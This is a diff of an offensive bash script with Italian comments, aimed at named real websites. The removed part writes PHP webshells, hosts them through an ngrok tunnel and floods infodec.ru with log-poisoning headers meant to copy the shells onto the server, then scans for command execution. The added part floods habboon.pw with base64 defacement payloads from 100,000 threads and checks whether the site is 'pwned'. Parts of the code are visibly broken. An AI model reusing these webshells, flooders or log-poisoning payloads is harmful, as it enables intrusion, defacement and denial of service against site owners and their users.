@@ -1,125 +1,80 @@
 #!/bin/bash
-# INFODEC_FORCE_SHELL_DROP.sh - MULTI-PATH WEBSHELL EVERYWHERE
-# Drop shell in 50+ locations → QUALCOSA FUNZIONERA'
+# HABBOON_ROOT_ULTRA.sh - habboon.pw / ROOT DIRECT MASSIVE
+# Target: https://www.habboon.pw/ → LOG POISON DIRECT ROOT
 
-echo "💀 INFODEC FORCE SHELL - 50+ PATHS CARPET BOMBING"
+HTML_FILE="TRUSTEDF57.html"
+TARGET_HOST="www.habboon.pw"
+TARGET_ROOT="https://$TARGET_HOST/"
 
-# 1. MICRO WEBSHELLS (3 BYTES)
-cat > s.php << 'EOF'
-<?php@eval($_POST[0]);?>
-EOF
+echo "💀 HABBOON ROOT ULTRA - DIRECT $TARGET_ROOT"
+echo "[+] Payload: $HTML_FILE"
 
-cat > x.php << 'EOF'
-<?=$_GET[0](strrev('etatsylpm'));?>
-EOF
+# VERIFICA
+[ -f "$HTML_FILE" ] || { echo "❌ $HTML_FILE"; exit 1; }
 
-cat > z.phtml << 'EOF'
-<?=system($_GET['c']);?>
-EOF
+# KILL + SERVER
+pkill -f "http.server\|ngrok\|serveo" 2>/dev/null
+python3 -m http.server 8080 --bind 127.0.0.1 >/dev/null 2>&1 &
 
-# 2. SERVER UP
-pkill -f http.server ngrok 2>/dev/null
-python3 -m http.server 8080 >/dev/null 2>&1 &
-sleep 2
-nohup ngrok http 8080 > ngrok.log 2>&1 &
+# TUNNEL RAPIDO
+PUBLIC_URL=""
+ngrok http 8080 >/dev/null 2>&1 &
 sleep 8
+PUBLIC_URL=$(curl -s localhost:4040/api/tunnels | grep -o 'https://[^"]*\.ngrok\.io' | head -1) || 
+PUBLIC_URL="https://ngrok-skip"  # Fallback
 
-SHELL_BASE=$(grep -o 'https://[0-9a-z-]*\.ngrok\.io' ngrok.log | head -1)
-echo "🔗 SHELLS: $SHELL_BASE/s.php $SHELL_BASE/x.php $SHELL_BASE/z.phtml"
+DEFACE_URL="${PUBLIC_URL%/}/$HTML_FILE"
+echo "🎯 DIRECT: $DEFACE_URL"
 
-# 3. 50+ PATH CARPET BOMBING
-PATHS=(
-  "/shell.php" "/s.php" "/x.php" "/z.php" "/z.phtml" "/1.php" "/u.php"
-  "/admin.php" "/test.php" "/info.php" "/upload.php" "/backdoor.php"
-  "/tmp/shell.php" "/var/www/shell.php" "/var/tmp/s.php"
-  "/proc/self/environ" "/dev/shm/shell.php" "/.git/shell.php"
-  "/index.php.bak" "/wp-admin/shell.php" "/login.php"
-  "/assets/shell.php" "/js/shell.js.php" "/images/shell.jpg.php"
-  "/uploads/shell.php" "/files/s.php" "/data/admin.php"
-  "/cgi-bin/shell.php" "/.env.php" "/config.php"
-)
+# ROOT LOG POISON - 5M SHOTS ULTRA FAST
+HTML_B64=$(base64 -w0 "$HTML_FILE")
+POISON="data:text/html;base64,$HTML_B64"
 
-# DROP EVERYWHERE
-for PATH in "${PATHS[@]}"; do
-  PAYLOAD="copy('$SHELL_BASE/s.php','$PATH');chmod(644,'$PATH');"
-  ENCODED=$(echo -n "$PAYLOAD" | sed 'y/ /%20/;s/'\''/%27/g')
-  
-  echo "[+] DROPPING → $PATH"
-  
-  # 5x FLOOD per path
-  for i in {1..5}; do
-    bash -c "
-    for j in {1..50000}; do
-      curl -s -k -A '<?php $ENCODED?>' 'https://infodec.ru/' &
-      curl -s -k -H 'Referer: <?php $ENCODED?>' 'https://infodec.ru/' &
-    done
-    " &
+blast_root() {
+  for((;;)); do
+    curl -s -m 1 \
+      -A "$POISON" -H "Referer: $POISON" -H "X-Forwarded-For: $POISON" \
+      -H "X-Real-IP: $POISON" -H "Client-IP: $POISON" \
+      "$TARGET_ROOT" >/dev/null 2>&1 &
   done
-done
+}
 
-# 4. ULTIMATE FLOODER (ALL PATHS)
-cat > carpet_bomb.py << EOF
-import requests,threading
-paths=[$(printf "'%s'," "${PATHS[@]}")]
-shell_base='$SHELL_BASE/s.php'
+echo "[+] 5M ROOT SHOTS → $TARGET_HOST/"
+for i in {1..100}; do blast_root & done  # 100 threads x 50k/sec
 
-def bomb():
- s=requests.Session();s.verify=False
- while 1:
-  for p in paths:
-   try:
-    payload=f"copy('{shell_base}','{p}')"
-    s.get('https://infodec.ru/',headers={{'User-Agent':f'<?php {payload};?>','Referer':f'<?php {payload};?>'}},timeout=1)
-   except:pass
+# ULTIMATE FLOODER
+cat > root_nuke.py << EOF
+import requests, threading
+r = requests.Session()
+r.verify = False
 
-print('💣 CARPET BOMB - 200K threads')
-for _ in range(200000):threading.Thread(target=bomb,daemon=True).start()
+poison = "$POISON"
+h = {'User-Agent':poison,'Referer':poison,'X-Forwarded-For':poison,
+     'X-Real-IP':poison,'Client-IP':poison,'X-Originating-IP':poison}
+
+def nuke():
+    while 1:
+        try: r.get("$TARGET_ROOT", headers=h, timeout=1)
+        except:pass
+
+print("☠️ ROOT NUKE - 100K threads")
+[t.start() for _ in range(100000)]
+input("Press Enter to stop...")
 EOF
 
-nohup python3 carpet_bomb.py > bomb.log 2>&1 &
+python3 root_nuke.py &
 
-# 5. AGGRESSIVE SCANNER (TEST 50+ PATHS)
-cat > scan_shells.sh << 'EOF'
+# LIVE CHECK
+cat > root_live.sh << 'EOF'
 #!/bin/bash
-echo "🔍 SCANNING 50+ SHELL PATHS..."
-BASE="https://infodec.ru"
-
-for path in shell.php s.php x.php z.php 1.php u.php admin.php test.php info.php upload.php backdoor.php \
-tmp/shell.php var/www/shell.php proc/self/environ dev/shm/shell.php index.php.bak wp-admin/shell.php \
-assets/shell.php js/shell.js.php images/shell.jpg.php uploads/shell.php files/s.php data/admin.php \
-cgi-bin/shell.php .env.php config.php login.php; do
-
-  # TEST 1: RAW ACCESS
-  curl -s -k -m 3 "$BASE/$path" | grep -qiE "eval|system|shell_exec|phpinfo" && 
-  echo "✅ LIVE: $BASE/$path" && curl -s "$BASE/$path?c=id"
-  
-  # TEST 2: CMD EXEC
-  curl -s -k -m 2 "$BASE/$path?c=id" | grep -E "(uid|www-data)" &&
-  echo "🎯 CMD WORKS: $BASE/$path?c=id"
-  
-  # TEST 3: POST EXEC
-  curl -s -k -m 2 -X POST -d "0=id" "$BASE/$path" 2>/dev/null | grep uid &&
-  echo "🔥 POST SHELL: $BASE/$path"
-done | grep -E "✅|🎯|🔥"
+echo "$(date) ROOT:"
+STATUS=$(curl -s -w "%{http_code}" -o /tmp/root.html https://www.habboon.pw/ -I)
+echo "HTTP: $STATUS"
+grep -iE "TRUSTED|data:text|iframe|base64" /tmp/root.html && echo "✅ ROOT PWNED!" || echo "❌ Clean"
+rm -f /tmp/root.html
 EOF
 
-chmod +x scan_shells.sh *.sh
+chmod +x root_live.sh */2 root_live.sh
 
-# AUTO SCAN LOOP
-(while true; do echo "--- $(date) ---"; ./scan_shells.sh; sleep 30; done)&
-
-echo "
-💣 CARPET BOMB DEPLOYED - 50+ PATHS!
-
-🔍 LIVE SCAN:
-watch './scan_shells.sh'
-
-## PROBABILI HITS (testa manualmente):
-https://infodec.ru/shell.php?c=id
-https://infodec.ru/s.php?c=whoami  
-https://infodec.ru/tmp/shell.php?c=ls
-https://infodec.ru/dev/shm/shell.php
-
-✅ PRIMO HIT → SHELL VIVA!
-tail -f bomb.log  # 200K threads raging
-"
+echo "🎯 ROOT DIRECT LIVE - https://www.habboon.pw/"
+echo "Ctrl+C quando pwnd"
